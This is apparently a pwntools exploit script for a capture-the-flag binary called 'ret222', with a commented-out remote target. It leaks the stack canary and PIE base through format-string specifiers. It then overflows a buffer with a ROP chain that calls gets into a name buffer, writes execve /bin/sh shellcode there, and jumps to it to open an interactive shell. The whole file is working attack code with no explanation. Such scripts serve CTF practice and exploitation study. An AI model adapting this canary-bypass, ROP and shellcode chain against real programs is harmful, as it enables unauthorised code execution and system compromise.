#!/usr/bin/env python
from pwn import *

m = process('./ret222')
host = 'csie.ctf.tw'
port = 10122
#m = remote(host,port)

context.arch = "amd64"
def s_name(name):
	m.recvuntil('>')
	m.sendline('1')
	m.recvuntil('name:')
	m.sendline(name)

def p_name():
	m.recvuntil('>')
	m.sendline('2')
	m.recvuntil('Name:')

def s_data(data):
	m.recvuntil('>')
	m.sendline('3')
	m.recvuntil('data:')
	m.sendline(data)

s_name('%23$p')
p_name()
canary = int(m.recvline()[:-20],16)
log.success("Get the value of canary : {}".format(hex(canary)))

name_off = 0x202020
_csu_init_off = 0xd40
s_name('%24$p')
p_name()
_csu_init_adr = int(m.recvline()[:-20],16)
pie = _csu_init_adr - _csu_init_off
name = pie + name_off
log.success('Get the PIE base : {}'.format(hex(pie)))
log.success("Get the address of name buffer : {}".format(hex(name)))

pop_rdi_off = 0xda3
main_off = 0xc00
get_off = 0x908
padding = 0x88
payload = 'a'*padding + p64(canary) + 'aaaaaaaa' + p64(pie+pop_rdi_off) + p64(name) + p64(pie+get_off) + p64(pie+main_off)
s_data(payload)
m.recvuntil('>')
m.sendline('4')
sleep(1)
sh = '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
m.sendline(sh)
sleep(1)

p2yload = 'a'*padding + p64(canary) + 'aaaaaaaa' + p64(name)
s_data(p2yload)
m.recvuntil('>')
m.sendline('4')

m.interactive()
